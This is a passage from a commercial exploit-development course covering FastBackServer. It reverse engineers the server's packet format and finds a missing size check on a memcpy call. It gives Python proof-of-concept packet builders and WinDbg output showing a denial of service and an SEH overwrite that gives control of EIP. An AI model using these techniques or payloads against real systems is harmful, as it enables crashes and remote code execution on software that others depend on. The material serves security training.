cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b: 
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40) 
 
0:006> dd esp L3 
0d6de328  0d733b30 486c8d4d 00001000 
 
0:006> dd 486c8d4d  
486c8d4d  ???????? ???????? ???????? ???????? 
486c8d5d  ???????? ???????? ???????? ???????? 
486c8d6d  ???????? ???????? ???????? ???????? 
486c8d7d  ???????? ???????? ???????? ???????? 
486c8d8d  ???????? ???????? ???????? ???????? 
486c8d9d  ???????? ???????? ???????? ???????? 
486c8dad  ???????? ???????? ???????? ???????? 
486c8dbd  ???????? ???????? ???????? ???????? 
 
0:006> p 
(158.1b54): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=486c9d4d ebx=062faef0 ecx=00000400 edx=00000000 esi=486c8d4d edi=0d733b30 
eip=00666e73 esp=0d6de318 ebp=0d6de320 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212 
FastBackServer!memcpy+0x33: 
00666e73 f3a5            rep movs dword ptr es:[edi],dword ptr [esi] 
Listing 408 - Invalid source buffer in memcpy call 
We notice that the DWORD at offset 0x14 in the psAgentCommand buffer, which has the value 
0x41414141, will cause the memcpy operation to have an invalid source buffer. This eventually 
leads to an invalid address and an access violation when executing the memcpy. 
We have just found our first vulnerability in the application before we even finish examining the 
protocol. Unfortunately, memcpy with an invalid source buffer will only cause a denial of service 
and not enable us to obtain EIP control. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
342 
While a DoS vulnerability can be useful in some situations, we want to push further and find 
vulnerabilities that would enable remote code execution. 
8.3.2.1 Exercises 
1. 
Adjust the maximum number of nodes in a graph and obtain Graph view code flow of 
FXCLI_OraBR_Exec_Command in IDA Pro. 
2. 
Perform reverse engineering to find the memory allocations and associated error messages 
for psAgentCommand and psCommandBuffer. 
3. 
Repeat the analysis shown in this section and map out the contents of the 
psAgentCommand buffer. 
4. 
Trigger a denial-of-service attack against FastBackServer. 
8.3.3 Exploiting Memcpy 
Many memory corruption vulnerabilities stem from memory manipulation operations with 
insufficiently-sanitized user input. In the previous section, we learned how to trigger an access 
violation and crash FastBackServer. 
In this section, we’ll dive deeper into the three memcpy operations we encountered and uncover a 
vulnerability that will provide us with full control of EIP. 
Let’s update our PoC to reflect the structure of the psAgentCommand buffer and populate it with 
values that will not cause an access violation.  
import socket 
import sys 
from struct import pack 
 
# Checksum 
buf = pack(">i", 0x630) 
# psAgentCommand 
buf += bytearray([0x41]*0x10) 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x200)  # 2nd memcpy: size field 
buf += pack("<i", 0x300)  # 3rd memcpy: offset 
buf += pack("<i", 0x300)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += bytearray([0x42]*0x100) # 1st buffer 
buf += bytearray([0x43]*0x200) # 2nd buffer 
buf += bytearray([0x44]*0x300) # 3rd buffer 
... 
Listing 409 - Updated proof of concept that has a valid psAgentCommand buffer 
In Listing 409, we have split the psCommandBuffer into three parts with sizes of 0x100, 0x200, 
and 0x300 bytes, respectively. Each of the three parts has different content, and the 
psAgentCommand buffer is updated to reflect the correct sizes. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
343 
The memcpy operations are interesting because we control both the size parameter and the 
source data, creating optimal conditions for a memory corruption vulnerability. 
Let’s set a breakpoint on the first memcpy call in WinDbg and resend our PoC: 
0:079> bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b 
 
0:079> g 
Breakpoint 0 hit 
eax=06e9ec0c ebx=05f7b9e0 ecx=0d513b30 edx=05f7c858 esi=05f7b9e0 edi=00669360 
eip=0056c8f1 esp=0d4be328 ebp=0d51fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b: 
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40) 
 
0:001> dd esp L3 
0d4be328  0d513b30 06e9ec0c 00000100 
 
0:001> dd 06e9ec0c 
06e9ec0c  42424242 42424242 42424242 42424242 
06e9ec1c  42424242 42424242 42424242 42424242 
06e9ec2c  42424242 42424242 42424242 42424242 
06e9ec3c  42424242 42424242 42424242 42424242 
06e9ec4c  42424242 42424242 42424242 42424242 
06e9ec5c  42424242 42424242 42424242 42424242 
06e9ec6c  42424242 42424242 42424242 42424242 
06e9ec7c  42424242 42424242 42424242 42424242 
Listing 410 - Arguments for first memcpy operation 
We already know that the second argument is our psCommandBuffer and the third argument is 
the buffer length that we supply. However, the first argument, the destination buffer, is not under 
our control. 
Let’s focus on this buffer. In a typical stack overflow vulnerability, a user-supplied buffer is copied 
onto the stack and overwrites the return address with a controlled value. In order for this type of 
attack to succeed, two conditions need to be satisfied. First, the destination buffer needs to 
reside on the stack at an address lower than the return address, as illustrated in Figure 119. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
344 
 
Figure 119: Illustration of a stack buffer overflow due to a copy operation 
If the destination buffer is at a higher address than where the return address is stored, the latter 
will never be overwritten. Second, we must ensure that the size of the copy is large enough to 
overwrite the return address. 
To check for the first condition, let’s compare the destination address with the upper- and lower-
bounds of the stack. We’ll use the !teb290 command in WinDbg to help us with this task: 
0:001> dd esp L3 
0d4be328  0d513b30 06e9ec0c 00000100 
 
0:062> !teb 
TEB at 0031e000 
    ExceptionList:        0d51ff38 
    StackBase:            0d520000 
    StackLimit:           0d4be000 
    SubSystemTib:         00000000 
    FiberData:            00001e00 
    ArbitraryUserPointer: 00000000 
... 
Listing 411 - Destination buffer is between the upper- and lower-bounds of the stack 
From the StackLimit and StackBase result, we know that the destination buffer resides on the 
current thread stack. 
 
290 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-teb 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
345 
Next we need to check if the destination buffer is located at a lower address than the storage 
address of the target return address we want to overwrite. 
We can identify the target function return address by dumping the call stack through the k291 
command, as shown in Listing 412. Next, we’ll locate the return address storage address using 
dds: 
0:062> k 
 # ChildEBP RetAddr   
00 0d51fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x43b 
01 0d51feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130 
02 0d51fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116 
03 0d51ff48 006693e9 FastBackServer!ORABR_Thread+0xef 
04 0d51ff80 76449564 FastBackServer!_beginthreadex+0xf4 
05 0d51ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24 
06 0d51ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b 
07 0d51ffec 00000000 ntdll!_RtlUserThreadStart+0x1b 
 
0:062> dds 0d51fe98 L2 
0d51fe98  0d51feb4 
0d51fe9c  0056a21f FastBackServer!FXCLI_C_ReceiveCommand+0x130 
 
0:006> ? 0d513b30 < 0d51fe9c 
Evaluate expression: 1 = 00000001 
Listing 412 - Call stack when performing the memcpy operation 
Comparing these values in Listing 412, we find that a return address overwrite is possible if we 
can copy enough data on the stack. 
We can determine this by calculating the difference between the destination buffer and the return 
address, as shown in Listing 413: 
0:062> ? 0d51fe9c  - 0d513b30  
Evaluate expression: 50028 = 0000c36c 
Listing 413 - The distance from destination buffer address to return address 
We must copy 0xC36C bytes or more to overwrite the return address, but as we previously found 
and reiterate in Figure 120, the maximum value for the size parameter in the first memcpy is set 
to 0x61A8 bytes. 
 
291 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/k--kb--kc--kd--kp--kp--kv--display-stack-
backtrace- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
346 
 
Figure 120: Check on the buffer size against 0x61A8 
In this case, it is clear that it will not be possible to create a stack buffer overflow condition. 
Reviewing the size check for the second memcpy operation, we find a comparison (Figure 121) 
using the size value from the psAgentCommand buffer at offset 0xC (offset 0x10 of the packet), 
as expected. 
 
Figure 121: Check on the second buffer size against 0x61A8 
This also indicates that in this case, a buffer overflow condition is not possible. 
For the third memcpy operation, we know from our previous analysis that the size of the copy is 
supposed to be specified at offset 0x14 (offset 0x18 from the beginning of the packet). However, 
if we examine the corresponding basic block for the size check, we find that the value compared 
to the maximum copy size value is at offset 0x4. This value was used to sanitize the size of the 
first memcpy too and it appears to be a programming mistake. 
 
Figure 122: Check on the third buffer size is using wrong size value 
Additionally, revisiting the basic block that performs the memcpy operation (Figure 123), we find 
that it uses the size given for the third buffer in psAgentCommand as expected: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
347 
 
Figure 123: Copy operation is performed with the unchecked size parameter 
Since the sanitization is applied using the wrong header buffer size, there is no restriction put in 
place for the size of this third memory copy operation. This memcpy uses our input data and an 
unsanitized size, making the perfect conditions for a stack buffer overflow. 
Let’s verify our analysis by single stepping to the third memcpy operation. This will allow us to 
inspect the destination buffer along with the return address and verify the presence of the 
vulnerability. As shown previously, we will calculate the minimum size required to overflow the 
buffer and overwrite the return address within from WinDbg: 
eax=05f7c858 ebx=05f7b9e0 ecx=06e9ef0c edx=0d50d980 esi=05f7b9e0 edi=00669360 
eip=0056c97d esp=0d4be328 ebp=0d51fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7: 
0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40) 
 
0:062> dd esp L3 
0d4be328  0d50d980 06e9ef0c 00000300 
 
0:062> k 
 # ChildEBP RetAddr   
00 0d51fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7 
01 0d51feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130 
02 0d51fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116 
03 0d51ff48 006693e9 FastBackServer!ORABR_Thread+0xef 
04 0d51ff80 76449564 FastBackServer!_beginthreadex+0xf4 
05 0d51ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24 
06 0d51ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b 
07 0d51ffec 00000000 ntdll!_RtlUserThreadStart+0x1b 
 
0:062> dds 0d51fe98 L2 
0d51fe98  0d51feb4 
0d51fe9c  0056a21f FastBackServer!FXCLI_C_ReceiveCommand+0x130 
 
0:062> ? 0d51fe9c - 0d50d980  
Evaluate expression: 75036 = 0001251c 
Listing 414 - Required size of 3rd buffer to overwrite return address 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
348 
The highlighted result in Listing 414 indicates we need a copy size greater than 0x1251C bytes to 
overwrite the return address. This poses a problem, as we discovered during our initial analysis 
that the maximum packet size is 0x4400 bytes. 
We learned earlier that it’s possible to fragment the TCP packets to send more 
than 0x4400 bytes, but this won’t be necessary to exploit this vulnerability, as we 
will soon explain. 
We can get around this restriction by playing with the offset value. During our reverse engineering 
analysis, we found that no checks are ever performed on the offset values. This means that we 
can supply any value we choose, even if it causes the source buffer address to point outside the 
psCommandBuffer. 
If we supply a negative offset, the copy operation will use a source buffer address lower than the 
psCommandBuffer one. This copy operation will succeed as long as the memory dereferenced 
during the copy is allocated. 
In this section, we discovered a vulnerability that might lead to control of the instruction pointer 
and, subsequently, remote code execution. However, we also found some restriction issues, 
making it more difficult to exploit the vulnerability. We’ll address these restrictions in the next 
section. 
8.3.3.1 Exercise 
1. 
Retrace the analysis to discover the missing size check related to the third memcpy 
operation. 
8.3.4 Getting EIP Control 
Earlier, we located a programming error in the application that enables us to trigger a memcpy 
operation with an unsanitized size value. In this section, we’ll analyze how to leverage this 
vulnerability and gain control of EIP. 
Theoretically, we could overwrite the target return address by precisely calculating the required 
offset and size for the overflow. 
However, a huge buffer length is required for a successful overflow, which means we would likely 
corrupt pointers on the stack that will be used by the target function before returning into the 
overwritten return address. In short, even if a direct EIP overwrite is possible, it would require a lot 
of work. 
Instead, we’ll perform an even larger copy and attempt to overwrite the SEH chain and trigger an 
exception by writing beyond the end of the stack. 
Let’s start our tests by crafting the third part of the psCommandBuffer. After a few tests, we found 
that a psCommandBuffer size of 0x2000 bytes is sufficient to overflow the SEH chain with our 
data. Next, we’ll set the third size parameter in the psAgentCommand buffer to 0x13000 to trigger 
the overflow condition (recall that the size needs to be greater than 0x1251C bytes). 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
349 
For the first and second buffers, we’ll use a size of 0x1000 bytes in order to reach the third 
memcpy call, passing the three size sanity checks. Finally, we’ll set the offset values to 0x0 for the 
first two memcpy operations in order to avoid invalid dereferences and denial-of-service 
conditions. 
Finally, to address the issue of the maximum packet size of 0x4400 bytes, we’ll supply a negative 
value for the third offset in the psAgentCommand buffer. If we supply the value -0x11000, the 
memcpy operation will first copy the 0x11000 bytes of memory preceding our psCommandBuffer, 
followed by the first 0x2000 bytes contained in psCommandBuffer. 
A truncated version of our updated PoC is shown in Listing 415.  
import socket 
import sys 
from struct import pack 
 
# Checksum 
buf = pack(">i", 0x2330) 
# psAgentCommand 
buf += bytearray([0x41]*0x10) 
buf += pack("<i", 0x0)     # 1st memcpy: offset 
buf += pack("<i", 0x1000)  # 1st memcpy: size field 
buf += pack("<i", 0x0)     # 2nd memcpy: offset 
buf += pack("<i", 0x1000)  # 2nd memcpy: size field 
buf += pack("<i", -0x11000)  # 3rd memcpy: offset 
buf += pack("<i", 0x13000) # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += bytearray([0x45]*0x100) # 1st buffer 
buf += bytearray([0x45]*0x200) # 2nd buffer 
buf += bytearray([0x45]*0x2000) # 3rd buffer 
... 
Listing 415 - Proof of concept to overwrite SEH 
Let’s view the updated PoC in action by restarting FastBackServer, attaching WinDbg, and setting 
a breakpoint on the third memcpy at FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7. 
After sending the new packet, we trigger the breakpoint and can examine the memcpy arguments: 
0:054> bp FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7 
 
0:054> g 
Breakpoint 0 hit 
eax=05fec890 ebx=05feade0 ecx=06f01c0c edx=0d26d980 esi=05feade0 edi=00669360 
eip=0056c97d esp=0d21e328 ebp=0d27fe98 iopl=0         nv up ei pl nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207 
FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7: 
0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40) 
 
0:006> dd esp L3 
0d21e328  0d26d980 06f01c0c 00013000 
 
0:006> dd 06f01c0c  
06f01c0c  00000000 00000000 00000000 00000000 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
350 
06f01c1c  00000000 00000000 00000000 00000000 
06f01c2c  00000000 00000000 00000000 00000000 
06f01c3c  00000000 00000000 00000000 00000000 
06f01c4c  00000000 00000000 00000000 00000000 
06f01c5c  00000000 00000000 00000000 00000000 
06f01c6c  00000000 00000000 00000000 00000000 
06f01c7c  00000000 00000000 00000000 00000000 
 
0:006> dd 06f01c0c + 11000 
06f12c0c  45454545 45454545 45454545 45454545 
06f12c1c  45454545 45454545 45454545 45454545 
06f12c2c  45454545 45454545 45454545 45454545 
06f12c3c  45454545 45454545 45454545 45454545 
06f12c4c  45454545 45454545 45454545 45454545 
06f12c5c  45454545 45454545 45454545 45454545 
06f12c6c  45454545 45454545 45454545 45454545 
06f12c7c  45454545 45454545 45454545 45454545 
Listing 416 - Updated arguments for the third memcpy call 
Listing 416 shows that the source buffer contains null bytes, but at offset 0x11000 into the 
source buffer, we find our expected 0x45 bytes. We practically moved the beginning of the source 
buffer outside its boundaries, precisely 0x11000 bytes before the beginning of it. 
Before stepping over the call to memcpy, let’s use !exchain to examine the structured exception 
handler chain: 
0:006> !exchain 
0d27ff38: FastBackServer!_except_handler3+0 (00667de4) 
  CRT scope  1, filter: FastBackServer!ORABR_Thread+fb (0048caa4) 
                func:   FastBackServer!ORABR_Thread+10d (0048cab6) 
0d27ff70: FastBackServer!_except_handler3+0 (00667de4) 
  CRT scope  0, filter: FastBackServer!_beginthreadex+112 (00669407) 
                func:   FastBackServer!_beginthreadex+126 (0066941b) 
0d27ffcc: ntdll!_except_handler4+0 (77307390) 
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+40 (772d2951) 
                func:   ntdll!__RtlUserThreadStart+7c (772d298d) 
0d27ffe4: ntdll!FinalExceptionHandlerPad54+0 (77313c86) 
Invalid exception stack at ffffffff 
Listing 417 - Existing and valid SEH chain 
The SEH chain in Listing 417 is complete and valid, as expected. We’ll step over the memcpy 
operation and dump the SEH chain again: 
0:006> p 
(8d8.e90): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=06f14c0c ebx=05feade0 ecx=00000260 edx=00000000 esi=06f1428c edi=0d280000 
eip=00666e73 esp=0d21e318 ebp=0d21e320 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212 
FastBackServer!memcpy+0x33: 
00666e73 f3a5            rep movs dword ptr es:[edi],dword ptr [esi] 
 
0:006> !exchain 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
351 
0d27ff38: 45454545 
Invalid exception stack at 45454545 
Listing 418 - Overwritten SEH chain after memcpy call 
We observe that the SEH chain has been overwritten with our data, 0x45454545. An access 
violation has also been triggered, enabling us to invoke the compromised SEH chain by 
continuing execution, as shown in Listing 419. 
0:006> g 
(8d8.e90): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=00000000 ecx=45454545 edx=77313b20 esi=00000000 edi=00000000 
eip=45454545 esp=0d21dd38 ebp=0d21dd58 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
45454545 ??              ??? 
Listing 419 - Control of EIP after triggering SEH chain 
We have obtained control of the EIP, which indicates a high likelihood of exploiting this 
vulnerability. Excellent! 
In this section, we discovered a vulnerability due to improper validation of input parameters that 
enabled us to trigger a memory copy operation of arbitrary size, while using our data. 
We found this vulnerability in the initial verification checks before reaching the internal 
FastBackServer functions, which can be triggered by supplying appropriate opcode values in our 
packet. We will push forward and examine the internal functions to discover additional 
vulnerabilities in the next section. 
8.3.4.1 Exercise 
1. 
Craft a payload with a negative offset for the third psCommandBuffer to overwrite the SEH 
chain and obtain control of EIP. 
8.3.4.2 Extra Mile 
Attempt to create a payload that overwrites the return address, but not the SEH chain. Explore the 
challenges that arise when trying to return from the current function, it may not be possible to 
overcome them. 
8.4 Digging Deeper to Find More Bugs 
In the previous section, we located a vulnerability that gives us control of the EIP register. This 
should provide us a good chance at remote code execution, but for now we’ll keep focusing on 
reverse engineering to locate another vulnerability. 
First, we’ll dig into the target program’s main functionality that can be reached through 
FastBackServer!FXCLI_OraBR_Exec_Command. Next, we will uncover an additional memory 
corruption through a different type of memory copy operation. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
352 
8.4.1 Switching Execution 
To continue the analysis, we must first revert our PoC to contain valid values in the 
psAgentCommand buffer, to avoid triggering the unsanitized memcpy operation vulnerabilities 
found in the previous sections. 
The truncated code is shown again in Listing 420.  
import socket 
import sys 
from struct import pack 
 
# Checksum 
buf = pack(">i", 0x630) 
# psAgentCommand 
buf += bytearray([0x41]*0x10) 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x200)  # 2nd memcpy: size field 
buf += pack("<i", 0x300)  # 3rd memcpy: offset 
buf += pack("<i", 0x300)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += bytearray([0x42]*0x100) # 1st buffer 
buf += bytearray([0x43]*0x200) # 2nd buffer 
buf += bytearray([0x44]*0x300) # 3rd buffer 
... 
Listing 420 - Proof of concept that has a valid psAgentCommand buffer 
Because of the access violation triggered in the last section, we need to restart FastBackServer, 
set 
a 
breakpoint 
just 
before 
the 
first 
memcpy 
at 
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b, and execute our PoC: 
0:079> bp FastBackServer!FXCLI_OraBR_Exec_Command+0x43b 
 
0:079> g 
Breakpoint 0 hit 
eax=071d6c0c ebx=05f1ac48 ecx=0d343b30 edx=05f1c890 esi=05f1ac48 edi=00669360 
eip=0056c8f1 esp=0d2ee328 ebp=0d34fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b: 
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40) 
 
0:001> dd esp L3 
0d2ee328  0d343b30 071d6c0c 00000100 
 
0:001> dd 071d6c0c  
071d6c0c  42424242 42424242 42424242 42424242 
071d6c1c  42424242 42424242 42424242 42424242 
071d6c2c  42424242 42424242 42424242 42424242 
071d6c3c  42424242 42424242 42424242 42424242 
071d6c4c  42424242 42424242 42424242 42424242 
071d6c5c  42424242 42424242 42424242 42424242 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
353 
071d6c6c  42424242 42424242 42424242 42424242 
071d6c7c  42424242 42424242 42424242 42424242 
Listing 421 - First memcpy with updated psAgentCommand buffer 
Once the breakpoint is hit, we can step over the three memcpy calls without triggering any 
exception: 
... 
eax=0d349cf0 ebx=05f1ac48 ecx=05f1c890 edx=071d6d0c esi=05f1ac48 edi=00669360 
eip=0056c937 esp=0d2ee328 ebp=0d34fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x481: 
0056c937 e804a50f00      call    FastBackServer!memcpy (00666e40) 
 
0:001> dd poi(esp+4) 
071d6d0c  43434343 43434343 43434343 43434343 
071d6d1c  43434343 43434343 43434343 43434343 
071d6d2c  43434343 43434343 43434343 43434343 
071d6d3c  43434343 43434343 43434343 43434343 
071d6d4c  43434343 43434343 43434343 43434343 
071d6d5c  43434343 43434343 43434343 43434343 
071d6d6c  43434343 43434343 43434343 43434343 
071d6d7c  43434343 43434343 43434343 43434343 
... 
eax=05f1c890 ebx=05f1ac48 ecx=071d6f0c edx=0d33d980 esi=05f1ac48 edi=00669360 
eip=0056c97d esp=0d2ee328 ebp=0d34fe98 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7: 
0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40) 
 
0:001> dd poi(esp+4) 
071d6f0c  44444444 44444444 44444444 44444444 
071d6f1c  44444444 44444444 44444444 44444444 
071d6f2c  44444444 44444444 44444444 44444444 
071d6f3c  44444444 44444444 44444444 44444444 
071d6f4c  44444444 44444444 44444444 44444444 
071d6f5c  44444444 44444444 44444444 44444444 
071d6f6c  44444444 44444444 44444444 44444444 
071d6f7c  44444444 44444444 44444444 44444444 
Listing 422 - Second and third memcpy with our psCommandBuffer as source 
After the last memcpy, we reach an interesting basic block shown in Figure 124. 
 
Figure 124: Comparison after the last memcpy operation 
What’s important for us in this basic block is the comparison between a static value (0x1090) and 
the dereferenced DWORD at offset 0x0C from the address pointed to by the EDX register. Let’s 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
354 
figure out what the DWORD is and where it comes from by single-stepping to the instruction in 
WinDbg as displayed in Listing 423. 
eax=05f1c890 ebx=05f1ac48 ecx=00000300 edx=05f1c880 esi=05f1ac48 edi=00669360 
eip=0056c9a6 esp=0d2ee334 ebp=0d34fe98 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!FXCLI_OraBR_Exec_Command+0x4f0: 
0056c9a6 817a0c90100000  cmp     dword ptr [edx+0Ch],1090h ds:0023:05f1c88c=41414141 
 
0:001> dd edx 
05f1c880  41414141 41414141 04edf020 41414141 
05f1c890  00000000 00000100 00000100 00000200 
05f1c8a0  00000300 00000300 41414141 071d6c08 
05f1c8b0  14b8f413 081d9b71 4c435846 534d5f49 
05f1c8c0  00005147 00000000 00000000 00000000 
05f1c8d0  00000000 00000000 00000000 00000000 
05f1c8e0  00000000 00000000 00000000 00000000 
05f1c8f0  00000000 00000000 00000000 00000000 
Listing 423 - DWORD comes from offset 0xC in the psAgentCommand buffer 
Analyzing the memory dump in the listing above, we learn that the DWORD used for the 
comparison is under our control and located within our psAgentCommand buffer. The EDX 
register points to the beginning of our header and thus, the DWORD used in the comparison is 
located at offset 0x0C from psAgentCommand. 
We can learn more about the purpose of this DWORD by examining the basic blocks following the 
comparison and the conditional jump encountered above. Let’s follow the chain of basic blocks in 
Figure 125. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
355 
 
Figure 125: Subsequent comparisons in following basic blocks 
These comparisons all use the same DWORD to determine the execution flow. This type of code 
resembles compiled C or C++ code consisting of a series of if statements that test the DWORD 
under our control. 
We typically find code like this after the application finishes parsing the network protocol, 
enabling us to choose which functionality to trigger within the target service. As mentioned 
before, the DWORD used in the comparison is often referenced as an opcode value, and every 
opcode typically leads to the execution of a different basic block or function in the code. 
Let’s follow the execution further down to 0x56CB53 in IDA Pro, where we reach the basic block 
displayed in Figure 126. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
356 
 
Figure 126: Subsequent comparisons in following basic blocks 
This block initiates the first of a series of comparisons between our controlled DWORD and all the 
application’s valid opcodes. We can follow one of these comparisons for opcode 0x500 as 
illustrated in Figure 127. 
 
Figure 127: Execution path for opcode value 0x500 
In short, we can use the opcode DWORD to reach a good chunk of the FastBackServer 
functionality. This opens up the possibility to explore new execution paths and discover new 
vulnerabilities. 
Let’s wrap up this section by updating the layout of the packet to reflect the results of our 
analysis: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
357 
0x00       : Checksum DWORD 
0x04 -> 0x30: psAgentCommand 
  - 0x04 -> 0xC:  Not used 
  - 0x10:         Opcode 
  - 0x14:         Offset for 1st copy operation 
  - 0x18:         Size of 1st copy operation 
  - 0x1C:         Offset for 2nd copy operation 
  - 0x20:         Size of 2nd copy operation 
  - 0x24:         Offset for 3rd copy operation 
  - 0x28:         Size of 3rd copy operation 
  - 0x2C -> 0x30: Not used 
0x34 -> End:  psCommandBuffer 
  - 0x34 + offset1 -> 0x34 + offset1 + size1: 1st buffer 
  - 0x34 + offset2 -> 0x34 + offset2 + size2: 2nd buffer 
  - 0x34 + offset3 -> 0x34 + offset3 + size3: 3rd buffer 
Listing 424 - Updated structure of packet 
We have now developed a solid understanding of the network packet structure required to trigger 
multiple internal functions from FXCLI_OraBR_Exec_Command. In the next section, we will locate 
an exploitable vulnerability. 
8.4.1.1 Exercises 
1. 
Revert the PoC to successfully pass all three memcpy operations without triggering an 
access violation and locate the opcode DWORD in the psAgentCommand buffer. 
2. 
Using static analysis, attempt to discover the upper and lower bounds of valid opcodes. 
8.4.2 Going Down 0x534 
After significant efforts to reverse engineer the FastBackServer’s network protocol, we have 
reached the main branching location inside FXCLI_OraBR_Exec_Command. From here, we can 
begin exploring and triggering FastBackServer’s internal functions while hunting for 
vulnerabilities. 
When searching for vulnerabilities, we must differentiate between memory corruption 
vulnerabilities and logical vulnerabilities. 
Memory corruption vulnerabilities will commonly occur during copy or move operations like 
memcpy, memmov,292 or strcpy,293 as well as operations like sscanf.294 
